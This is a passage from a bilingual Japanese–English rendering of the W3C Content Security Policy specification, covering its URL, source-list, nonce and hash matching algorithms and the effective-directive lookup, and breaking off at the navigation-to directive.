この文書は、中核を成す指令の集合を定義し、他の仕様が~modularに拡張するための枠組みを整える。
この文書が~~発行された時点では、次の安定的な文書が~CSPを拡張している：
◎
This document defines a core set of directives, and sets up a framework for modular extension by other specifications. At the time this document was produced, the following stable documents extend CSP:
</p>

<ul>
	<li>
`MIX$r は、
`block-all-mixed-content^dir 指令を定義する。
◎
[MIX] defines block-all-mixed-content
</li>
	<li>
`UPGRADE-INSECURE-REQUESTS$r は、
`upgrade-insecure-requests^dir 指令を定義する。
◎
[UPGRADE-INSECURE-REQUESTS] defines upgrade-insecure-requests
</li>
	<li>
`SRI$r は、
`require-sri-for^dir 指令を定義する【参照先不明】。
◎
[SRI] defines require-sri-for
</li>
</ul>

<p>
~CSPに対する拡張は、 `RFC7762$r に従って登録され~MUST。
特に、その文書の 4.2 節に論じられている判定基準に注意。
◎
Extensions to CSP MUST register themselves via the process outlined in [RFC7762]. In particular, note the criteria discussed in Section 4.2 of that document.
</p>

<p>
新たな指令は、各種~hook
—
`要請前~検査$A,
`要請後~検査$A,
`応答~検査$A,
`初期化$A —
を利用して，自身を~Fetch／~HTMLに統合する~SHOULDである。
◎
New directives SHOULD use the pre-request check, post-request check, response check, and initialization hooks in order to integrate themselves into Fetch and HTML.
</p>


		</section>
		<section id="algorithms">
<h3 title="Matching Algorithms">6.6. 各種~照合~algo</h3>

			<section id="matching-urls">
<h4 title="URL Matching">6.6.1. URL 照合</h4>

				<section id="does-request-violate-policy">
<h5 title="Does request violate policy?">6.6.1.1. %要請 は%施策 に違反するか？</h5>

<p>
次の~algoは、所与の
( `要請$ %要請, `施策$ %施策 )
に対し，［
%要請 が %施策 に違反するならば 違反された`指令$ ／
違反しないならば `非違反^i
］を返す：
◎
Given a request (request) and a policy (policy), this algorithm returns the violated directive if the request violates the policy, and "Does Not Violate" otherwise.
</p>

<ol>
	<li>
%違反ed指令 ~LET `非違反^i
◎
Let violates be "Does Not Violate".
</li>
	<li>
<p>
~FOR
%施策 内の ~EACH ( %指令 ) に対し：
◎
For each directive in policy:
</p>
		<ol>
			<li>
%結果 ~LET
( %要請, %施策 )
に対し，
%指令 の`要請前~検査$Aを実行した結果
◎
Let result be the result of executing directive’s pre-request check on request and policy.
</li>
			<li>
~IF［
%結果 ~EQ `阻止ed^i
］
⇒
%違反ed指令 ~LET %指令
◎
If result is "Blocked", then let violates be directive.
</li>
		</ol>
	</li>
	<li>
~RET %違反ed指令
◎
Return violates.
</li>
</ol>

				</section>
				<section id="match-nonce-to-source-list">
<h5 title="Does nonce match source list?">6.6.1.2. %~nonce は %~source~list に合致するか？</h5>

<p>
次の~algoは、所与の
( `要請$の`暗号用~nonce~metadata$rq %~nonce, `~source~list$ %~source~list )
に対し，［
%~nonce が %~source~list 内のいずれかの式に合致するならば `合致es^i ／
合致しないならば `非合致^i
］を返す：
◎
Given a request’s cryptographic nonce metadata (nonce) and a source list (source list), this algorithm returns "Matches" if the nonce matches one or more source expressions in the list, and "Does Not Match" otherwise:
</p>

<ol>
	<li>
~Assert：
%~source~list ~NEQ ~NULL
◎
Assert: source list is not null.
</li>
	<li>
~IF［
%~nonce ~EQ 空~文字列
］
⇒
~RET `非合致^i
◎
If nonce is the empty string, return "Does Not Match".
</li>
	<li>
<p>
~FOR
%~source~list 内の ~EACH ( %式 ) に対し：
◎
For each expression in source list:
</p>
		<ol>
			<li>
~IF［［
%式 は `nonce-source$p 文法に合致する
~AND
%~nonce ~EQ %式 の `base64-value$p 成分
］
⇒
~RET `合致es^i
◎
If expression matches the nonce-source grammar, and nonce is a case-sensitive match for expression’s base64-value part, return "Matches".
</li>
		</ol>
	</li>
	<li>
~RET `非合致^i
◎
Return "Does Not Match".
</li>
</ol>

				</section>
				<section id="match-request-to-source-list">
<h5 title="Does request match source list?">6.6.1.3. %要請 は %~source~list に合致するか？</h5>

<p>
この~algoは、所与の
( `要請$ %要請, `~source~list$ %~source~list )
に対し，次を返す
⇒
`~urlは ( 生成元, ~redirect回数 ) について~source~listに合致するか？$A( %要請 の`~url$rq, %~source~list, %要請 の`生成元$rq, %要請 の`~redirect回数$rq )
◎
Given a request (request), and a source list (source list), this algorithm returns the result of executing §6.6.1.5 Does url match source list in origin with redirect count? on request’s url, source list, request’s origin, and request’s redirect count.
</p>

<p class="note">注記：
これは，一般に、所与の`要請$を検証0するために
`指令$の`要請前~検査$A~algoから利用される。
◎
Note: This is generally used in directives' pre-request check algorithms to verify that a given request is reasonable.
</p>

				</section>
				<section id="match-response-to-source-list">
<h5 title="Does response to request match source list?">6.6.1.4. %要請 に対する %応答 は %~source~list に合致するか？</h5>

<p>
この~algoは、所与の
( `応答$ %応答, `要請$ %要請, `~source~list$ %~source~list )
<!-- ＊原文抜け 要請 -->
に対し，次を返す
⇒
`~urlは ( 生成元, ~redirect回数 ) について~source~listに合致するか？$A( %応答 の`~url$rs, %~source~list, %要請 の`生成元$rq, %要請 の`~redirect回数$rq )
◎
Given a request (request), and a source list (source list), this algorithm returns the result of executing §6.6.1.5 Does url match source list in origin with redirect count? on response’s url, source list, request’s origin, and request’s redirect count.
</p>

<p class="note">注記：
これは，一般に、所与の`応答$を検証0するために
`指令$の`要請後~検査$A~algoから利用される。
◎
Note: This is generally used in directives' post-request check algorithms to verify that a given response is reasonable.
</p>

				</section>
				<section id="match-url-to-source-list">
<h5 title="Does url match source list in origin with redirect count?">6.6.1.5. %~urlは ( %生成元, %~redirect回数 ) について %~source~list に合致するか？</h5>


<p>
次の~algoは、所与の
( `~URL$ %~url, `~source~list$ %~source~list, `生成元$ %生成元, 整数 %~redirect回数 )
に対し，
%~url は %~source~list 内のいずれかの`~source式$に［
合致するならば `合致es^i ／
合致しないならば `非合致^i
］を返す：
◎
Given a URL (url), a source list (source list), an origin (origin), and a number (redirect count), this algorithm returns "Matches" if the URL matches one or more source expressions in source list, or "Does Not Match" otherwise:
</p>

<ol>
	<li>
~Assert：
%~source~list ~NEQ ~NULL
◎
Assert: source list is not null.
</li>
	<li>
~IF［
%~source~list は空である
］
⇒
~RET `非合致^i
◎
If source list is an empty list, return "Does Not Match".
</li>
	<li>
<p >
~IF［
%~source~list は単独の文字列 %s のみからなる
］~AND［
%s ~EQ~ACI "`none$pl"
］
⇒
~RET `非合致^i
◎
If source list contains a single item which is an ASCII case-insensitive match for the string "'none'", return "Does Not Match".
</p>

<p class="note">注記：
空の %~source~list （すなわち、（
<samp>`script-src^dir host1</samp>
とは対照的に）値を伴わない指令
<samp>`script-src$dir</samp>
）は、 `none$pl を包含している %~source~list に等価になり，どの~URLにも合致しない。
◎
Note: An empty source list (that is, a directive without a value: script-src, as opposed to script-src host1) is equivalent to a source list containing 'none', and will not match any URL.
</p>
	</li>
	<li>
<p>
~FOR
%~source~list 内の ~EACH ( %式 ) に対し：
◎
For each expression in source list:
</p>
		<ol>
			<li>
~IF［
`~urlは ( 生成元, ~redirect回数 ) について式に合致するか？$A( %~url, %式, %生成元, %~redirect回数 )
~EQ `合致es^i
］
⇒
~RET `合致es^i
◎
If §6.6.1.6 Does url match expression in origin with redirect count? returns "Matches" when executed upon url, expression, origin, and redirect count, return "Matches".
</li>
		</ol>
	</li>
	<li>
~RET `非合致^i
◎
Return "Does Not Match".
</li>
</ol>

				</section>
				<section id="match-url-to-source-expression">
<h5 title="Does url match expression in origin with redirect count?">6.6.1.6. %~url は ( %生成元, %~redirect回数 ) について %式 に合致するか？</h5>

<p>
次の~algoは、
( `~URL$ %~url, `~source式$ %式, `生成元$ %生成元, 整数 %~redirect回数 )
が与えられた下で，
%~url が %式 に［
合致するならば `合致es^i ／
合致しないならば `非合致^i
］を返す：
◎
Given a URL (url), a source expression (expression), an origin (origin), and a number (redirect count), this algorithm returns "Matches" if url matches expression, and "Does Not Match" otherwise.
</p>

<p class="note">注記：
%生成元 は［
%式 が相対的に解決されるべき資源
］の`生成元$である
— 例えば "`self$pl" は、文脈の その一片に依存して別個の意味になる。
◎
Note: origin is the origin of the resource relative to which the expression should be resolved. "'self'", for instance, will have distinct meaning depending on that bit of context.
</p>


<ol>
	<li>
<p>
~IF［
%式 ~EQ `~asterisk$
］~AND［
%~url の`~scheme$u ~IN { `~network~scheme$u, %生成元 の`~scheme$u }
］
⇒
~RET `合致es^i
◎
If expression is the string "*", return "Matches" if one or more of the following conditions is met:
• url’s scheme is a network scheme.
• url’s scheme is the same as origin’s scheme.
</p>


<p class="note">注記：
この~logicは、［
非`~network~scheme$uからの資源を許容するためには，明示的に~whitelist化するか
— 例： `default-src * data: custom-scheme-1: custom-scheme-2:^s —
または、被保護~資源は同じ~schemeから読込まれ~MUST
］ことを意味する。
◎
Note: This logic means that in order to allow resource from a non-network scheme, it has to be either explicitly whitelisted: default-src * data: custom-scheme-1: custom-scheme-2:, or the protected resource must be loaded from the same scheme.
</p>
	</li>
	<li>
<p>
~IF［
%式 は `scheme-source$p 文法に合致する (A)
］~OR［
%式 は `host-source$p 文法に合致する (B)
］：
◎
If expression matches the scheme-source or host-source grammar:
</p>
		<ol>
			<li>
%~scheme成分 ~LET ［
(A) ならば %式 ／
(B) ならば %式 の `scheme-part$p
］
◎
↓</li>
			<li>
<p>
~IF［
%~scheme成分 ~NEQ~ACI %~url の `~scheme$u
］~AND［
次のいずれの条件も満たされない
］
⇒
~RET `非合致^i
：
◎
If expression has a scheme-part that is not an ASCII case-insensitive match for url’s scheme, then return "Does Not Match" unless one of the following conditions is met:
</p>
				<ul>
					<li>
［
%~scheme成分 ~EQ~ACI `http^l
］~AND［
%~url の `~scheme$u ~EQ `https^l
］
◎
expression’s scheme-part is an ASCII case-insensitive match for "http" and url’s scheme is "https"
</li>
					<li>
［
%~scheme成分 ~EQ~ACI `ws^l
］~AND［
%~url の `~scheme$u ~IN
{ `wss^l, `http^l, `https^l }
］
◎
expression’s scheme-part is an ASCII case-insensitive match for "ws" and url’s scheme is "wss", "http" or "https"
</li>
					<li>
［
%~scheme成分 ~EQ~ACI `wss^l
］~AND［
%~url の `~scheme$u ~EQ `https^l
］
◎
expression’s scheme-part is an ASCII case-insensitive match for "wss" and url’s scheme is "https"
</li>
			</ul>
		</li>
		<li>
~IF［
(A)
］
⇒
~RET `合致es^i
◎
If expression matches the scheme-source grammar, return "Matches".
</li>
	</ol>

<div class="note">
<p>注記：
この~logicは、実質的に次を意味する：
</p>

<ul>
	<li>
`script-src http:^s
は
`script-src http: https:^s
に等価になる（ (A) の場合）
</li>
	<li>
`script-src http://example.com/^s
は
`script-src http://example.com https://example.com^s
に等価になる（ (B) の場合）
</li>
</ul>

<p>
同様に，WebSocket ~schemeは、対応する HTTP ~schemeに等価になる。
短く言えば、明示的に保安的~schemeでない式は，保安的~schemeへの昇格を常に許容する。
</p>
◎
Note: This logic effectively means that script-src http: is equivalent to script-src http: https:, and script-src http://example.com/ is equivalent to script-src http://example.com https://example.com. As well as WebSocket schemes are equivalent to corresponding HTTP schemes. In short, we always allow a secure upgrade from an explicitly insecure expression.
</div>
	</li>
	<li>
<p>
~IF［
%式 は `host-source$p 文法に合致する
］：
◎
If expression matches the host-source grammar:
</p>
		<ol>
			<li>
~IF［
%~url の`~host$u ~EQ ~NULL
］
⇒
~RET `非合致^i
◎
If url’s host is null, return "Does Not Match".
</li>
			<li>
<p>
~IF［
%式 は `scheme-part$p を持たない
］~AND［
次のいずれの条件も満たされない
］
⇒
~RET `非合致^i
：
◎
If expression does not have a scheme-part, then return "Does Not Match" unless one of the following conditions is met:
</p>
				<ol>
					<li>
%生成元 の`~scheme$u ~EQ %~url の`~scheme$u
◎
origin’s scheme is url’s scheme
</li>
					<li>
［
%生成元 の`~scheme$u ~EQ `http^l
］~AND［
%~url の`~scheme$u ~IN
{ `https^l, `ws^l, `wss^l }
］
◎
origin’s scheme is "http", and url’s scheme one of "https", "ws", or "wss".
</li>
					<li>
［
%生成元 の`~scheme$u ~EQ `https^l
］~AND［
%~url の`~scheme$u ~EQ `wss^l
］
◎
origin’s scheme is "https", and url’s scheme is "wss".
</li>
			</ol>

<p class="note">注記：
上の `scheme-part$p に対するときと同様に、~schemeを伴わない `host-source$p 式は，非保安的~schemeから保安的~schemeへの昇格を許容する。
◎
Note: As with scheme-part above, we allow schemeless host-source expressions to be upgraded from insecure schemes to secure schemes.
</p>
			</li>
			<li>
%~host成分 ~LET %式 の `host-part$p
◎
↓</li>
			<li>
<p>
~IF［
%~host成分 の最初の文字 ~EQ `~asterisk$
］：
◎
If the first character of expression’s host-part is an U+002A ASTERISK character (*):
</p>
				<ol>
					<li>
%残 ~SET %式 から先頭の`~asterisk$を除去した結果
◎
Let remaining be the result of removing the leading "*" from expression.
</li>
					<li>
~IF［
%残 ~NEQ~ACI［
%~url の`~host$uの（ %残 と同じ長さの）~~尾部
］］
⇒
~RET `非合致^i
◎
If remaining (including the leading U+002E FULL STOP character (.)) is not an ASCII case-insensitive match for the rightmost characters of url’s host, then return "Does Not Match".
</li>
				</ol>
			</li>
			<li>
~ELIF［
%~host成分 ~NEQ~ACI %~url の`~host$u
］
⇒
~RET `非合致^i
◎
If the first character of expression’s host-part is not an U+002A ASTERISK character (*), and url’s host is not an ASCII case-insensitive match for expression’s host-part, return "Does Not Match".
</li>
			<li>
<div>
<p>
~IF［
次のいずれかの条件が満たされる
］
⇒
~RET `非合致^i
</p>
				<ul>
					<li>
［
%~host成分 は `IPv4address$p 規則 `RFC3986$r に合致する
］~AND［
%~host成分 ~NEQ `127.0.0.1^l
］
</li>
					<li>
%~host成分 は `IPv6~address$uである
</li>
				</ul>

◎
If expression’s host-part matches the IPv4address rule from [RFC3986], and is not "127.0.0.1"; or if expression’s host-part is an IPv6 address, return "Does Not Match".
</div>

<p class="note">注記：
この仕様の将来~versionは、用法や需要に依存して，~literalによる［
IPv6 ／ IPv4
］~addressを許容するかもしれない。
しかしながら、 IP ~addressの保安上の特質は，名前を有する~hostに比して弱いので、作者には，可能0なら後者を選好することが奨励される。
◎
Note: A future version of this specification may allow literal IPv6 and IPv4 addresses, depending on usage and demand. Given the weak security properties of IP addresses in relation to named hosts, however, authors are encouraged to prefer the latter whenever possible.
</p>
			</li>
			<li>
%~port成分 ~LET 
%式 は `port-part$p を［
包含しないならば ~NULL ／
包含するならば それ
］
◎
↓</li>
			<li>
<p>
~IF［
次のいずれも満たされない
］
⇒
~RET `非合致^i：
◎
↓</p>
				<ul>
					<li>
［
%~port成分 ~EQ ~NULL
］~AND［
%~url の`~port$u ~EQ %~url の`~scheme$uに対する`既定~port$u
］
◎
If expression does not contain a port-part, and url’s port is not the default port for url’s scheme, return "Does Not Match".
◎
If expression does contain a port-part, return "Does Not Match" unless one of the following conditions is met:
</li>
					<li>
%~port成分 ~EQ `~asterisk$
◎
expression’s port-part is "*".
</li>
					<li>
%~port成分 が表す数 ~EQ %~url の`~port$u
◎
expression’s port-part is the same number as url’s port.
</li>
					<li>
［
%~port成分 が表す数 ~EQ 80
］~AND［
%~url の`~port$u ~EQ 443
］
◎
expression’s port-part is 80, and url’s port is 443.
</li>
				</ul>
			</li>

			<li>
<p>
~IF［
%式 は
空でない `path-part$p を包含する
］~AND［
%~redirect回数 ~EQ 0
］：
◎
If expression contains a non-empty path-part, and redirect count is 0, then:
</p>
				<ol>
					<li>
%正確~合致 ~LET ［
%式 の `path-part$p の~~最後の文字 ~EQ `~slash$
ならば ~F ／
~ELSE_ ~T
］
◎
Let exact match be false if the final character of expression’s path-part is the U+002F SOLIDUS character (/), and true otherwise.
</li>
					<li>
%~path~list ~LET
%式 の `path-part$p を`~slash$で`厳密に分割-$した結果
◎
Let path list be the result of strictly splitting expression’s path-part on the U+002F SOLIDUS character (/).
</li>
					<li>
~IF［
%~path~list の~item数 ~GT %~url の`~path$uの~item数
］
⇒
~RET `非合致^i
◎
If path list has more items than url’s path, return "Does Not Match".
</li>
					<li>
~IF［
%正確~合致 ~EQ ~T
］~AND［
%~path~list の~item数 ~NEQ %~url の`~path$uの~item数
］
⇒
~RET `非合致^i
◎
If exact match is true, and path list does not have the same number of items as url’s path, return "Does Not Match".
</li>
					<li>
<p>
~FOR
%~path~list 内の ~EACH ( %式~path片 ) に対し：
◎
For each expression piece in path list:
</p>
						<ol>
							<li>
%~url~path片 ~LET %~url の`~path$u内の［
%式~path片 と同じ~index
］に位置する~item
◎
Let url piece be the next item in url’s path.
</li>
							<li>
~IF［
［
%式~path片 を`~percent復号-$uした結果
］ ~NEQ ［
%~url~path片 を`~percent復号-$uした結果
］
］
⇒
~RET `非合致^i
◎
Percent decode expression piece.
◎
Percent decode url piece.
◎
If expression piece is not a case-sensitive match for url piece, return "Does Not Match".
</li>
						</ol>
					</li>
				</ol>
			</li>
			<li>
~RET `合致es^i
◎
Return "Matches".
</li>
		</ol>
	</li>
	<li>
<p>
~IF［
%式 ~EQ~ACI "`self$pl"
］~AND［
次のいずれかの条件は満たされる
］
⇒
~RET `合致es^i
：
◎
If expression is an ASCII case-insensitive match for "'self'", return "Matches" if one or more of the following conditions is met:
</p>
		<ul>
			<li>
%生成元 と［
%~url の`生成元$u
］は同じである
◎
origin is the same as url’s origin
</li>
			<li>

<p>
次の条件すべてが満たされる：
</p>
				<ul>
					<li>
%生成元 の`~host$u ~EQ %~url の`~host$u
</li>
					<li>
%生成元 の`~port$u ~EQ %~url の`~port$u
— この比較においては
⇒
両~urlのそれぞれに対し、その`~port$uに対する~NULL値は，その`~scheme$uに対する`既定~port$uと見なす。
</li>
					<li>
［
%生成元 の`~scheme$u ~EQ `http^l
］~OR［
%~url の`~scheme$u ~IN { `https^l, `wss^l }
］
</li>
				</ul>
◎
origin’s host is the same as url’s host, origin’s port and url’s {{URL/port} are either the same or the default ports for their respective schemes, and one or more of the following conditions is met:
• url’s scheme is "https" or "wss"
• origin’s scheme is "http"
</li>
		</ul>

<p class="note">注記：
上の `scheme-part$p の~logicと同様に、
"`self$pl" 照合~algoは、そうするのが安全なときには，保安的~schemeへの昇格を許容する。
これらの昇格は、［
特定0の~schemeに対する既定の~port ／
被保護~資源の生成元に合致する~port
］上で稼働中の報告先に，制限される
— 昇格の成功-が理にかなうと期待されるものについて取り扱うには、これで十分と見られるので。
◎
Note: Like the scheme-part logic above, the "'self'" matching algorithm allows upgrades to secure schemes when it is safe to do so. We limit these upgrades to endpoints running on the default port for a particular scheme or a port that matches the origin of the protected resource, as this seems sufficient to deal with upgrades that can be reasonably expected to succeed.
</p>
	</li>
	<li>
~RET `非合致^i
◎
Return "Does Not Match".
</li>
</ol>



				</section>
				<section id="effective-directive-for-a-request">
<h5 title="Get the effective directive for request">6.6.1.7. %要請 に対する有効な指令を取得する</h5>

<p>
各種 `~fetch指令$は、特定の型の`要請$を制御する。
次の~algoは、所与の
( `要請$ %要請 )
に対し，［
~NULL, または
`有効な指令@
の`名前$
］を返す：
◎
Each fetch directive controls a specific type of request. Given a request (request), the following algorithm returns either null or the name of the request’s effective directive:
</p>

<!-- ＊表形式化 -->

<ol>
	<li>
<p>
%要請 の`種別$rqに応じて：
◎
Switch on request’s type, and execute the associated steps:
</p>
		<dl class="switch">
			<dt>空~文字列</dt>
			<dd>
				<ol>
					<li>
<p>
%要請 の`起動元$rqに応じて：
</p>

						<dl class="switch">
							<dt>`fetch^l</dt>
							<dd>
<ol><li>~RET `connect-src$dir
</li></ol>
							</dd>

							<dt>`manifest^l</dt>
							<dd>
<ol><li>~RET `manifest-src$dir
</li></ol>
							</dd>
						</dl>
◎
If the request’s initiator is "fetch", return connect-src.
◎
If the request’s initiator is "manifest", return manifest-src.
</li>
					<li>
<p>
%要請 の`行先$rqに応じて：
</p>
						<dl class="switch">
							<dt>`subresource^l</dt>
							<dd>
<ol><li>~RET `connect-src$dir
</li></ol>
							</dd>

							<dt>`unknown^l</dt>
							<dd>
<ol><li>~RET `object-src$dir
</li></ol>
							<dt>`document^l</dt>
							<dd>
<ol><li>
~IF［
%要請 の`~target閲覧文脈$rqは`入子の閲覧文脈$である
］
⇒
~RET `frame-src$dir
</li></ol>
							</dd>
						</dl>
◎
If the request’s destination is "subresource", return connect-src.
◎
If the request’s destination is "unknown", return object-src.
◎
If the request’s destination is "document" and the request’s target browsing context is a nested browsing context, return frame-src.
</li>
				</ol>
			</dd>

			<dt>`audio^l</dt>
			<dt>`track^l</dt>
			<dt>`video^l</dt>
			<dd>
<ol><li>~RET `media-src$dir
◎
Return media-src.
</li></ol>
			</dd>

			<dt>`font^l</dt>
			<dd>
<ol><li>~RET `font-src$dir
◎
Return font-src.
</li></ol>
			</dd>

			<dt>`image^l</dt>
			<dd>
<ol><li>~RET `image-src$dir
◎
Return image-src.
</li></ol>
			</dd>

			<dt>`style^l</dt>
			<dd>
<ol><li>~RET `style-src$dir
◎
Return style-src.
</li></ol>
			</dd>

			<dt>`script^l</dt>
			<dd>
				<ol>
					<li>
<p>
%要請 の`行先$rqに応じて：
◎
Switch on request’s destination, and execute the associated steps:
</p>
						<dl class="switch">
							<dt>`script^l</dt>
							<dt>`subresource^l</dt>
							<dd>
<ol><li>~RET `script-src$dir
◎
Return script-src.
</li></ol>
							</dd>

							<dt>`serviceworker^l</dt>
							<dt>`sharedworker^l</dt>
							<dt>`worker^l</dt>
							<dd>
<ol><li>~RET `worker-src$dir
◎
Return worker-src.
</li></ol>
							</dd>
						</dl>
					</li>
				</ol>
			</dd>
		</dl>
	</li>
	<li>
~RET ~NULL
◎
Return null.
</li>
</ol>

				</section>
			</section>
			<section id="matching-elements">
<h4 title="Element Matching Algorithms">6.6.2. 要素に対する照合~algo</h4>


				<section id="is-element-nonceable">
<h5 title="Is element nonceable?">6.6.2.1. %要素 は~nonceableか？</h5>

<p>
この~algoは、所与の`要素$ %要素に対し，
`nonce-source$p 式を［
適用できるならば（
<a href="#security-nonce-stealing">~nonceの盗用 節</a>
を見よ） `~nonceable^i ／
適用すべきでないならば `~nonceableでない^i
］を返す：
◎
Given an Element (element), this algorithm returns "Nonceable" if a nonce-source expression can match the element (as discussed in §7.2 Nonce Stealing), and "Not Nonceable" if such expressions should not be applied.
</p>

<ol>
	<li>
~IF［
%要素 は 名前 `nonce^l の属性を有さない
］
⇒
~RET `~nonceableでない^i
◎
If element does not have an attribute named "nonce", return "Not Nonceable".
</li>

	<li>
<p>
~IF［
%要素 は `script$e 要素である
］
⇒
~FOR
%要素 内の ~EACH ( %属性 ) に対し：
◎
If element is a script element, then for each attribute in element:
</p>

		<ol>
			<li>
~IF［
%属性 の名前は `~ASCII大小無視$で［
`&lt;script^l, `&lt;style^l
］のいずれかに合致する
］
⇒
~RET `~nonceableでない^i
◎
If attribute’s name is an ASCII case-insensitive match for the string "&lt;script" or the string "&lt;style", return "Not Nonceable".
</li>

	<li>
~IF［
%属性 の値は `~ASCII大小無視$で［
`&lt;script^l, `&lt;style^l
］のいずれかに合致する文字列を包含している
］
⇒
~RET `~nonceableでない^i
◎
If attribute’s value contains an ASCII case-insensitive match the string "&lt;script" or the string "&lt;style", return "Not Nonceable".
</li>
		</ol>
	</li>

	<li>
~RET `~nonceable^i
◎
Return "Nonceable".
</li>
</ol>


<p class="issue">
この処理には、既存の要素から~nonceを盗用して 注入する~scriptを読込ませるような，~dangling-markup攻撃の~riskを軽減することが~~意図されている。
しかしながら、~scriptを実行すべきかどうか決定するときに，すべての属性と その値を走査するぶん，高価でもある。
ここでは、この検査を，要素が~nonceを有していて `script$e 要素であるときに限り走査することにより，その影響0をできるだけ抑えようとしているが、その影響0を知るまでは，この~algoは “~risk下にある” ものと見なすべきであろう。
<a href="https://github.com/w3c/webappsec-csp/issues/98">&lt;https://github.com/w3c/webappsec-csp/issues/98&gt;</a>
◎
This processing is meant to mitigate the risk of dangling markup attacks that steal the nonce from an existing element in order to load injected script. It is fairly expensive, however, as it requires that we walk through all attributes and their values in order to determine whether the script should execute. Here, we try to minimize the impact by doing this check only for script elements when a nonce is present, but we should probably consider this algorithm as "at risk" until we know its impact. &lt;https://github.com/w3c/webappsec-csp/issues/98&gt;
</p>

				</section>
				<section id="match-element-to-source-list">
<h5 title="Does element match source list for type and source?">6.6.2.2. %要素 は ( %型, %~source ) について %~source~list に合致するか？</h5>

<p>
次の~algoは、
( `要素$ %要素, `~source~list$ %~list, 文字列 %型, 文字列 %~source )
が与えられた下で，［
`合致es^i または `非合致^i
］を返す：
◎
Given an Element (element), a source list (list), a string (type), and a string (source), this algorithm returns "Matches" or "Does Not Match".
</p>

<ol>
	<li>
<div class="p">
<p>
~Assert：
%~source は次のいずれかの~IDL属性~値を包含する：
</p>

<ul ><li>`script$e 要素の `text$m 属性
</li><li>`style$e 要素の `textContent$m 属性
</li><li>`script$e 要素のいずれかの`~event~handler~IDL属性$
</li></ul>

◎
Assert: source contains the value of a script element’s text IDL attribute, the value of a style element’s textContent IDL attribute, or the value of one of a script element’s event handler IDL attribute.
</div>


<p class="note">注記：
このことは、 %~source は，自身が埋込まれている~pageの符号化方式で解釈されることを意味する。
詳細は、`~HTMLとの統合$ 節における統合~点を見よ。
◎
Note: This means that source will be interpreted with the encoding of the page in which it is embedded. See the integration points in §4.2 Integration with HTML for more detail.
</p>
	</li>
	<li>
( `~nonceか~hashを包含する^v , `~hashと属性を照合する^v )
~LET ( ~F, ~F )
◎
Let contains nonce or hash and hashes match attributes be false.
</li>
	<li>
<p>
~FOR
%~list 内の ~EACH ( %式 ) に対し：
◎
For each expression in list:
</p>
		<ol>
			<li>
~IF［
%式 は［
`nonce-source$p, `hash-source$p
］いずれかの文法に合致する
］
⇒
`~nonceか~hashを包含する^v ~SET ~T
◎
If expression matches the nonce-source or hash-source grammar, set contains nonce or hash to true.
</li>
			<li>
~IF［
%式 ~EQ~ACI `unsafe-hashed-attributes$pl
］
⇒
`~hashと属性を照合する^v ~SET ~T
◎
If expression is an ASCII case-insensitive match for the keyword-source "'unsafe-hashed-attributes'", set hashes match attributes to true.
</li>
		</ol>
	</li>
	<li>
<p>
~IF［
`~nonceか~hashを包含する^v ~EQ ~F
］~AND［
%~list 内に［
`~source式$ ~EQ~ACI `unsafe-inline^pl
］はある
］
⇒
~RET `合致es^i
◎
If contains nonce or hash is false, and list contains a source expression which is an ASCII case-insensitive match for the string "'unsafe-inline'", then return "Matches".
</p>

<p class="note">注記：
この~logicは、 %~list が `unsafe-inline^pl に加えて［
`nonce-source$p, `hash-source$p
］のいずれかを包含している場合には、
`unsafe-inline^pl の効果はなくなることを意味する。
◎
Note: This logic means that if list contains both "'unsafe-inline'" and either nonce-source or hash-source, "'unsafe-inline'" will have no effect.
</p>
	</li>
	<li>
<p>
~IF［
%型 ~IN { `script^l, `style^l }
］~AND［
`要素は~nonceableか？$A( %要素 ) ~EQ `~nonceable^i 
］：
◎
If type is "script" or "style", and §6.6.2.1 Is element nonceable? returns "Nonceable" when executed upon element:
</p>
		<ol>
			<li>
<p>
~FOR
%~list 内の ~EACH ( %式 ) に対し：
◎
For each expression in list:
</p>

				<ol>
					<li>
~IF［
%式 は `nonce-source$p 文法に合致する
］~AND［［
%要素 は `nonce$a 属性を有する
］~AND［
その値 ~EQ［
%式 の `base64-value$p 成分
］］
⇒
~RET `合致es^i
◎
If expression matches the nonce-source grammar, and element has a nonce attribute whose value is a case-sensitive match for expression’s base64-value part, return "Matches".
</li>
				</ol>
			</li>
		</ol>

<p class="note">注記：
~nonceは、~inlineの［
`script$e ／ `style$e
］要素には適用されるが、いずれの要素の属性にも適用されない。
◎
Note: Nonces only apply to inline script and inline style, not to attributes of either element.
</p>

	</li>
	<li>
<p>
~IF［
%型 ~IN { `script^l, `style^l }
］~OR［
`~hashと属性を照合する^v ~EQ ~T
］：
◎
If type is "script" or "style", or hashes match attributes is true:
</p>
		<ol>
			<li>
<p>
~FOR
%~list 内の ~EACH ( %式 ) に対し：
◎
For each expression in list:
</p>
				<ol>
					<li>
~IF［
%式 は `hash-source$p 文法に合致しない
］
⇒
~CONTINUE
◎
If expression matches the hash-source grammar:
</li>
					<li>
%~algo ~LET ［
%式 の`hash-algorithm$p 成分を`~ASCII小文字化$した結果
］に応じて，次で与えられる~algo `SHA2$r
⇒
`sha256^l ならば SHA-256 ／
`sha384^l ならば SHA-384 ／
`sha512^l ならば SHA-512 ／
~ELSE_ ~NULL
◎
Let algorithm be null.
◎
If expression’s hash-algorithm part is an ASCII case-insensitive match for "sha256", set algorithm to SHA-256.
◎
If expression’s hash-algorithm part is an ASCII case-insensitive match for "sha384", set algorithm to SHA-384.
◎
If expression’s hash-algorithm part is an ASCII case-insensitive match for "sha512", set algorithm to SHA-512.
◎
</li>
					<li>
~IF［
%~algo ~EQ ~NULL
］
⇒
~CONTINUE
◎
If algorithm is not null:
</li>
					<li>
~IF［
%式 の `base64-value$p 成分 ~EQ［
%~source に %~algo を適用した結果
］を `base64 符号化-$した結果
］］
⇒
~RET `合致es^i
◎
Let actual be the result of base64 encoding the result of applying algorithm to source.
◎
If actual is a case-sensitive match for expression’s base64-value part, return "Matches".
</li>
				</ol>
			</li>
		</ol>

<p class="note">注記：
~hashは、~inlineの［
`script$e ／ `style$e
］に適用される。
`unsafe-hashed-attributes$pl ~source式が在する場合、それらも［
~event~handler ／ ~style属性
］に適用される。
◎
Note: Hashes apply to inline script and inline style. If the "'unsafe-hashed-attributes'" source expression is present, they will also apply to event handlers and style attributes.
</p>
	</li>
	<li>
~RET `非合致^i
◎
Return "Does Not Match".
</li>
</ol>


				</section>
			</section>
			<section id="directive-navigation-to">
<h4 title="navigation-to">6.3.3. `navigation-to^dir</h4>


<p>
`navigation-to@dir
指令は、文書が何らかの手段（
`a$e, `form$e, `window.location^c, `window.open^c, 等々
）で~navigate先にできる`~URL$を制約する。
この指令の名前と値の構文は、次の`~ABNF$で述べられる：
◎
The navigation-to directive restricts the URLs to which a document can navigate by any means (a, form, window.location, window.open, etc.). The directive’s syntax is described by the following ABNF grammar:
